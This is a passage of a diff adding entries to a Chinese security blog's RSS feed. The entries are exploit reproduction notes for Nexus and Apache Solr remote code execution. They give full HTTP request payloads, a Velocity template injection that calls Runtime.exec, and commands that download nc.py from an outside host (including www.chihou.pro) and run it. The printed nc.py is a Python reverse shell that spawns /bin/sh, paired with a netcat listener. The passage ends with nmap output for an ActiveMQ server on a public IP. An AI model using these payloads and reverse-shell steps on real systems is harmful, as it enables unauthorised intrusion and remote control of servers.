class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;    y,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;   'Exploit.Test234',&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;    z.getBytes('latin1'),    0,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;    3054&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);x.getMethod('test', ''.class).invoke(null, 'ifconfig');'done!'}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;property&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;jexl&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;limit&quot;&lt;/span&gt;: 50, &lt;span class=&quot;s2&quot;&gt;&quot;page&quot;&lt;/span&gt;: 1&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;previewAssets&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;getshell:&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;下载反弹文件&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;wget http://vps_to_your_py:8000/nc.py&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;py&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;vps_ip&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;vps&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;terminal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lvnp&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18080&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Listening&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1111&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;python nc.py&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;即可。&lt;/p&gt;
+</description>
+        <pubDate>Sun, 23 Aug 2020 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/Nexus/vuln-Cve/</link>
+        <guid isPermaLink="true">/blog/2020/Nexus/vuln-Cve/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>笔记</category>
+        
+        <category>src</category>
+        
+        <category>CVE</category>
+        
+        <category>信息搜集</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 「vulnhub」:Apace-RCE漏洞复现总结</title>
+        <description>&lt;h2 id=&quot;apache-solr-vuln&quot;&gt;Apache-solr-vuln&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.137.181:8983/solr/admin/cores?indexInfo=false&amp;amp;wt=json&quot;&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;responseHeader&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:0,
+    &lt;span class=&quot;s2&quot;&gt;&quot;QTime&quot;&lt;/span&gt;:0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
+  &lt;span class=&quot;s2&quot;&gt;&quot;initFailures&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,
+  &lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;demo&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;demo&quot;&lt;/span&gt;,
+      &lt;span class=&quot;s2&quot;&gt;&quot;instanceDir&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/var/solr/data/demo&quot;&lt;/span&gt;,
+      &lt;span class=&quot;s2&quot;&gt;&quot;dataDir&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/var/solr/data/demo/data/&quot;&lt;/span&gt;,
+      &lt;span class=&quot;s2&quot;&gt;&quot;config&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;solrconfig.xml&quot;&lt;/span&gt;,
+      &lt;span class=&quot;s2&quot;&gt;&quot;schema&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;managed-schema&quot;&lt;/span&gt;,
+      &lt;span class=&quot;s2&quot;&gt;&quot;startTime&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;2020-08-22T01:42:03.422Z&quot;&lt;/span&gt;,
+      &lt;span class=&quot;s2&quot;&gt;&quot;uptime&quot;&lt;/span&gt;:51628
+          &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;关键是这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deomo:namel;instanceDir...&lt;/code&gt;，修改数据包&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type: application/json&lt;/code&gt;，post数据修改内容：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /solr/demo/config HTTP/1.1
+Host: 192.168.137.181:8983
+User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Macintosh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Intel Mac OS X 10.15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:79.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
+Accept-Language: zh-CN,zh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8,zh-TW&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.7,zh-HK&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5,en-US&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.3,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.2
+Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/json
+Content-Length: 259
+
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;update-queryresponsewriter&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;startup&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;lazy&quot;&lt;/span&gt;,
+    &lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;velocity&quot;&lt;/span&gt;,
+    &lt;span class=&quot;s2&quot;&gt;&quot;class&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;solr.VelocityResponseWriter&quot;&lt;/span&gt;,
+    &lt;span class=&quot;s2&quot;&gt;&quot;template.base.dir&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+    &lt;span class=&quot;s2&quot;&gt;&quot;solr.resource.loader.enabled&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt;,
+    &lt;span class=&quot;s2&quot;&gt;&quot;params.resource.loader.enabled&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+/////////////////////////////////////////////////////////////////////////////////////
+
+反包：
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
+Content-Length: 149
+
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;responseHeader&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:0,
+    &lt;span class=&quot;s2&quot;&gt;&quot;QTime&quot;&lt;/span&gt;:425&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
+  &lt;span class=&quot;s2&quot;&gt;&quot;WARNING&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;This response format is experimental.  It is likely to change in the future.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;rce payload:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;solr/bin4xin/select?wt&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;velocity&amp;amp;v.template&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;custom&amp;amp;v.template.custom&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%27%27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;.class.forName&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27java.lang.Runtime%27&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;.class.forName&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27java.lang.Character%27&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;.class.forName&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27java.lang.String%27&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rt&lt;/span&gt;.getRuntime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27pwd%27&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;+&lt;span class=&quot;nv&quot;&gt;$ex&lt;/span&gt;.waitFor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ex&lt;/span&gt;.getInputStream&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;+%23foreach&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;+in+[1..&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;.available&lt;span class=&quot;o&quot;&gt;()])&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;.valueOf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chr&lt;/span&gt;.toChars&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;.read&lt;span class=&quot;o&quot;&gt;()))&lt;/span&gt;%23end
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;getshell:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$rt&lt;/span&gt;.getRuntime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27curl%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py%27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+
+wget%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py
+
+&lt;span class=&quot;nv&quot;&gt;$rt&lt;/span&gt;.getRuntime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27python%20/tmp/nc.py%27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;不过一般如果存在基本认证，就需要先过认证才行。&lt;/p&gt;
+
+&lt;h2 id=&quot;apache-activemq-vuln&quot;&gt;Apache ActiveMQ-vuln&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;探测&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;39.99.161.182
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.095s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT     STATE SERVICE VERSION
+8161/tcp open  http    Jetty 8.1.16.v20140903
+|_http-server-header: Jetty&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.1.16.v20140903&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Apache ActiveMQ
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sat, 22 Aug 2020 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/Apache/vuln-Cve/</link>
+        <guid isPermaLink="true">/blog/2020/Apache/vuln-Cve/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>笔记</category>
+        
+        <category>vulnhub</category>
+        
+        <category>CVE</category>
+        
+        <category>漏洞复现</category>
+        
+      </item>
+    
   </channel>
 </rss>
